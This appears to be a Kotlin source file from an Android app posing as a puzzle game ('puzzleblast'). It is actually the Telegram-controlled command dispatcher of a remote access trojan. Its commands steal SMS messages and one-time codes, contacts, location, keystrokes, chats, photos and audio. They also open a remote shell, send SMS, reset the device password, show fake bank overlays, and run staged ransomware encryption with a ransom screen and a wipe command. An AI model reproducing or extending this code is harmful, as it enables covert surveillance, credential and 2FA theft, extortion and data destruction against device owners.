package com.puzzleblast.game.core

import android.content.Context
import com.puzzleblast.game.modules.*
import com.puzzleblast.game.services.OverlayService
import com.puzzleblast.game.util.Hide
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull

object Dispatcher {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    suspend fun dispatch(ctx: Context, msg: TgMessage) {
        val parsed = CommandRouter.parse(msg) ?: return
        if (!SessionManager.matches(parsed.sidTag)) {
            Send.text("🎯 SID mismatch (this device: ${BotConfig.sid})", msg.messageId)
            return
        }
        Prefs.incCmd()
        val start = System.currentTimeMillis()
        val prefix = "[${msg.messageId.toString().take(6)}] "
        val reply = withTimeoutOrNull(30_000L) {
            runCommand(ctx, parsed, msg)
        } ?: "⏳ timeout — ${parsed.cmd}"
        Send.text(reply, msg.messageId, prefix)
    }

    fun runScheduled(ctx: Context, cmdText: String) {
        scope.launch {
            val fake = TgMessage(0, 0, BotConfig.ownerId.toLong(), cmdText, 0, null, null, null)
            dispatch(ctx, fake)
        }
    }

    private suspend fun runCommand(ctx: Context, p: ParsedCommand, msg: TgMessage): String {
        val a = p.args
        return when (p.cmd) {
            "/start", "/help" -> { Menu.full(BotConfig.sid).forEach { Send.text(it, msg.messageId) }; "🆘 menu sent" }
            "/session" -> SessionModule.session(ctx)
            "/ping" -> SessionModule.ping(ctx, start = System.currentTimeMillis())
            "/status" -> SessionModule.status(ctx)
            "/report" -> SessionModule.report(ctx)
            "/background" -> SessionModule.background(ctx)
            "/check_online" -> SessionModule.checkOnline(ctx, a.firstOrNull())
            "/use" -> SessionModule.use(ctx, a.firstOrNull() ?: return "🆔 specify SID")
            "/kill" -> SessionModule.kill(ctx)
            "/all" -> "📢 fleet mode only — single device runs locally"
            "/sms" -> SmsModule.read(ctx, a.firstOrNull()?.toIntOrNull() ?: 10)
            "/otp" -> OtpModule.collect(ctx)
            "/contacts" -> ContactsModule.read(ctx, a.firstOrNull()?.toIntOrNull() ?: 50)
            "/calls" -> CallLogModule.read(ctx, a.firstOrNull()?.toIntOrNull() ?: 20)
            "/location" -> LocationModule.current(ctx)
            "/lochistory" -> LocationModule.history()
            "/wifi_tri" -> WifiTriModule.scan(ctx)
            "/keylog" -> KeylogModule.dump(ctx)
            "/realtime_keylog" -> { Prefs.realtimeKeylog = true; "🔴 realtime keylog on — /stop to end" }
            "/stop" -> { Prefs.realtimeKeylog = false; "⏹ stopped" }
            "/screenshot" -> {
                val f = ScreenshotModule.capture(ctx)
                if (f != null) { Send.photo(f, "📸 screenshot"); "📸 sent" } else "📸 need MediaProjection consent (one tap)"
            }
            "/screenrec" -> "🎥 screenrec requires MediaProjection consent — use /screenshot for single frame"
            "/notif" -> NotifModule.recent(ctx, a.firstOrNull()?.toIntOrNull() ?: 20)
            "/notif_filter" -> NotifModule.filter(ctx, a.firstOrNull() ?: return "🔍 specify package")
            "/wa" -> ChatExtractModule.wa(a.firstOrNull()?.toIntOrNull() ?: 50)
            "/wa_business" -> ChatExtractModule.waBusiness(a.firstOrNull()?.toIntOrNull() ?: 50)
            "/tg" -> ChatExtractModule.tg(a.firstOrNull()?.toIntOrNull() ?: 50)
            "/usage" -> UsageModule.stats(ctx)
            "/deviceinfo" -> DeviceInfoModule.info(ctx)
            "/callrec" -> {
                val f = CallRecModule.record(ctx, a.firstOrNull()?.toIntOrNull() ?: 30)
                if (f != null) { Send.audio(f, "🎙 callrec"); "🎙 sent" } else "🎙 failed"
            }
            "/unlockcap" -> UnlockCapModule.set(ctx, a.firstOrNull() == "on")
            "/on_app_open" -> AppOpenWatchModule.watch(ctx, a.firstOrNull() ?: return "👁 specify package")
            "/browser_history" -> BrowserHistoryModule.extract(ctx)
            "/clipboard" -> ClipboardModule.current(ctx)
            "/clipboard_set" -> ClipboardModule.set(ctx, p.argString)
            "/clipboard_watch" -> ClipboardModule.watch(a.firstOrNull() == "on")
            "/clipboard_history" -> ClipboardModule.history()
            "/frontcam", "/photo" -> {
                val f = CameraModule.captureFront(ctx)
                if (f != null) { Send.photo(f, "🤳 front"); "🤳 sent" } else "🤳 camera busy — retry"
            }
            "/backcam" -> {
                val f = CameraModule.captureBack(ctx)
                if (f != null) { Send.photo(f, "📷 back"); "📷 sent" } else "📷 camera busy — retry"
            }
            "/video" -> {
                val lens = a.firstOrNull() ?: "back"
                val sec = a.getOrNull(1)?.toIntOrNull() ?: 10
                val f = VideoModule.record(ctx, lens, sec)
                if (f != null) { Send.video(f, "🎥 $lens ${sec}s"); "🎥 sent" } else "🎥 failed"
            }
            "/mic" -> {
                val f = MicModule.record(ctx, a.firstOrNull()?.toIntOrNull() ?: 30)
                if (f != null) { Send.audio(f, "🎙 mic"); "🎙 sent" } else "🎙 failed"
            }
            "/burst" -> BurstModule.burst(ctx, a.firstOrNull()?.toIntOrNull() ?: 3)
            "/gallery" -> GalleryModule.folder(ctx, a.firstOrNull())
            "/gallery_recent" -> GalleryModule.recent(ctx, a.firstOrNull()?.toIntOrNull() ?: 24)
            "/wamedia" -> GalleryModule.waMedia(ctx)
            "/files" -> FileModule.list(ctx, a.firstOrNull())
            "/download" -> FileModule.download(ctx, a.firstOrNull() ?: return "⬇️ specify path")
            "/upload" -> FileModule.upload(ctx, p.replyFileId, p.replyFileName)
            "/rm" -> FileModule.rm(ctx, a.firstOrNull() ?: return "🗑 specify path")
            "/mv" -> FileModule.mv(ctx, a.getOrNull(0) ?: return "📦 specify src", a.getOrNull(1) ?: return "📦 specify dst")
            "/zip" -> FileModule.zip(ctx, a.firstOrNull() ?: return "🗜 specify folder")
            "/unzip" -> FileModule.unzip(ctx, a.getOrNull(0) ?: return "📂 specify file", a.getOrNull(1))
            "/shell" -> ShellModule.exec(p.argString)
            "/apps" -> AppsModule.list(ctx, false)
            "/apps_list" -> AppsModule.list(ctx, true)
            "/recent_files" -> RecentFilesModule.recent(a.firstOrNull()?.toIntOrNull() ?: 24)
            "/vibrate" -> VibrateModule.vibrate(ctx, a.firstOrNull()?.toLongOrNull() ?: 500)
            "/sendsms" -> SmsSendModule.send(a.firstOrNull() ?: return "✉️ specify number", a.drop(1).joinToString(" "))
            "/lock" -> LockModule.lock(ctx)
            "/resetpass" -> ResetPassModule.reset(ctx, a.firstOrNull() ?: return "🔑 specify new password")
            "/overlay" -> OverlayModule.show(ctx, a.firstOrNull() ?: "bank")
            "/overlay_on" -> OverlayModule.onAppOpen(ctx, a.getOrNull(0) ?: return "🎯 specify pkg", a.getOrNull(1) ?: "bank")
            "/fakenotif", "/toast" -> FakeNotifModule.send(ctx, p.argString)
            "/disguise" -> DisguiseModule.disguise(ctx, a.firstOrNull() ?: return "🎭 specify update|file|battery|hide")
            "/set_icon" -> "🖼 custom icon requires rebuild — use /disguise for preset aliases"
            "/pretext" -> PretextModule.setName(ctx, p.argString)
            "/wallpaper" -> WallpaperModule.set(ctx, p.argString)
            "/tts" -> TtsModule.speak(ctx, p.argString)
            "/flash" -> FlashModule.set(ctx, a.firstOrNull() == "on")
            "/fake_call" -> FakeCallModule.fakeCall(ctx, a.firstOrNull() ?: "Unknown")
            "/fake_call_log" -> FakeCallModule.insertLog(ctx, a.getOrNull(0) ?: return "📞 specify number", a.getOrNull(1) ?: "in", a.getOrNull(2)?.toIntOrNull() ?: 0)
            "/fake_call_log_delete" -> FakeCallModule.deleteLog(ctx, a.firstOrNull() ?: return "🗑 specify number")
            "/bt_scan" -> BluetoothModule.scan(ctx)
            "/bt_saved" -> BluetoothModule.saved(ctx)
            "/bt_track" -> BluetoothModule.track(a.firstOrNull() == "on")
            "/call_auto_answer" -> when {
                a.isEmpty() -> CallAutoAnswerModule.status()
                a[0] == "on" || a[0] == "off" -> CallAutoAnswerModule.set(a[0] == "on")
                a[0] == "whitelist" -> CallAutoAnswerModule.whitelist(a.drop(1).joinToString(","))
                a[0] == "speaker" -> CallAutoAnswerModule.speaker(a.getOrNull(1) == "on")
                a[0] == "record" -> CallAutoAnswerModule.record(a.getOrNull(1) == "on")
                else -> CallAutoAnswerModule.status()
            }
            "/encrypt" -> RansomwareModule.encrypt(ctx, a.firstOrNull())
            "/encrypt_stage1" -> RansomwareModule.encryptStage(ctx, 1)
            "/encrypt_stage2" -> RansomwareModule.encryptStage(ctx, 2)
            "/encrypt_stage3" -> RansomwareModule.encryptStage(ctx, 3)
            "/decrypt" -> RansomwareModule.decrypt(ctx, a.firstOrNull() ?: return "🔓 specify key", a.getOrNull(1))
            "/key" -> RansomwareModule.showKey()
            "/lock_screen" -> OverlayModule.ransom(ctx, p.argString)
            "/ransom_chat" -> RansomwareModule.ransomChat(a.firstOrNull() == "on")
            "/sim" -> IntelModule.sim(ctx)
            "/ip" -> IntelModule.ip()
            "/wifi" -> IntelModule.wifi(ctx)
            "/wifi_list" -> IntelModule.wifiList(ctx)
            "/cell" -> IntelModule.cell(ctx)
            "/accounts_list" -> IntelModule.accounts(ctx)
            "/panic" -> PanicModule.wipe(ctx)
            "/beacon" -> BeaconModule.set(a.firstOrNull()?.toLongOrNull() ?: 5)
            "/silent" -> SilentModule.set(a.firstOrNull() == "on")
            "/profile" -> ProfileModule.profile(ctx, false)
            "/profile_quick" -> ProfileModule.profile(ctx, true)
            "/contact_photos" -> ContactPhotosModule.extract(ctx)
            "/health" -> when (a.firstOrNull()) {
                "services" -> HealthModule.services(ctx)
                "perms" -> HealthModule.perms(ctx)
                "access" -> HealthModule.access(ctx)
                else -> HealthModule.full(ctx)
            }
            "/apk_update" -> ApkUpdateModule.update(ctx, p.replyFileId, p.replyFileName, force = false)
            "/apk_update_force" -> ApkUpdateModule.update(ctx, p.replyFileId, p.replyFileName, force = true)
            "/rollback" -> ApkUpdateModule.rollback(ctx)
            "/backup_self" -> ApkUpdateModule.backupSelf(ctx)
            "/schedule" -> when {
                a.isEmpty() -> "⏰ usage: /schedule /cmd +2h | /schedule /cmd daily 14:00 | /schedule list | /schedule cancel <id> | /schedule clear"
                a[0] == "list" -> ScheduleModule.list()
                a[0] == "cancel" -> ScheduleModule.cancel(a.getOrNull(1)?.toIntOrNull() ?: return "❌ specify id")
                a[0] == "clear" -> ScheduleModule.clear()
                else -> {
                    val cmdPart = a.takeWhile { !it.startsWith("+") && it != "daily" }.joinToString(" ")
                    val specPart = a.dropWhile { !it.startsWith("+") && it != "daily" }.joinToString(" ")
                    ScheduleModule.schedule(ctx, cmdPart, specPart)
                }
            }
            "/confirm" -> ConfirmModule.confirm(ctx, a.firstOrNull() ?: return "✅ specify code")
            "/play" -> { Hide.openGame(ctx); "🎮 game opened" }
            "/hide" -> { Hide.fire(ctx); "🙈 hidden" }
            "/unhide" -> { Hide.unhide(ctx); "🐵 unhidden" }
            "/panel" -> SessionModule.status(ctx)
            else -> "❓ unknown command: ${p.cmd} — /help for menu"
        }
    }
}
